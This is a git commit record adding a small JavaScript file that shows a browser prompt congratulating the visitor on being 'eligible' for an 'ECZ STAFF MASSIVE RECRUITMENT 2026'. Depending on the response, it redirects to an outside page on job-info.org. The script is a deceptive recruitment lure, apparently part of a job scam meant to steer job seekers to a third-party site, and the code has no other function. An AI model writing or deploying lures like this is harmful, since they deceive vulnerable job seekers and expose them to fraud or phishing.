db99d7f336f116bab43b60d885078b75b602f960
jobxvir <banners-blinks.9g@icloud.com>
2026-04-29 07:15:35 +0100

    Create activatezamb.js

---
+++ activatezamb.js
@@ -0,0 +1,8 @@
+var password = 'APPLY NOW'
+password = prompt(
+  'Congratulations! You are eligible to Apply for ECZ STAFF MASSIVE RECRUITMENT 2026. Press OK to APPLY.',
+  'APPLY NOW'
+);
+if (password != 'APPLY NOW') {
+  location.href = 'https://job-info.org/Ecz-Official-Recruitment.html';
+}
